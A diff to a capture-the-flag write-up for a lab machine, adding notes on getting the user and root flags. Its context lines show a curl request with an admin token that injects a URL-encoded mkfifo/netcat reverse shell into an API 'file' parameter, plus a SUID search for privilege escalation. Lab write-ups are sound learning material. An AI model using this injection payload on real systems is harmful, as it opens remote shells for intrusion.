@@ -82,6 +82,8 @@ and response `"80bf34c fixed typos 🎉\n0c75212 now we can view logs from serve
 curl -X GET -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNmMDE2NDA4MGE4MjA0NWFiNWVjZjMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3R1c2VyQGRhc2l0aC53b3JrcyIsImlhdCI6MTY0ODI5NjM4M30.7XoBvpYsxSS4z1nQzHgCmkzGWn5quqV1orfQEPJ9038' -i 'http://10.10.11.120/api/logs?file=;rm%20-f%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.74%204242%20%3E%2Ftmp%2Ff'
 ```
 
+I got the reverse shell and **User flag** ✔️
+
 # PrivEsc
 
 `find / -type f -perm -u=s 2>/dev/null`
@@ -90,8 +92,11 @@ curl -X GET -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjN
 Find `/opt/count` and visiting `/opt` there is a .c file also.
 ![code](img/code.png)
 
-`strings CoreDump`
+
+Now I search the flag in the `strings CoreDump`.
 ![coredump](img/coredump.png)
+
+**Root flag** ✔️
 
 
 
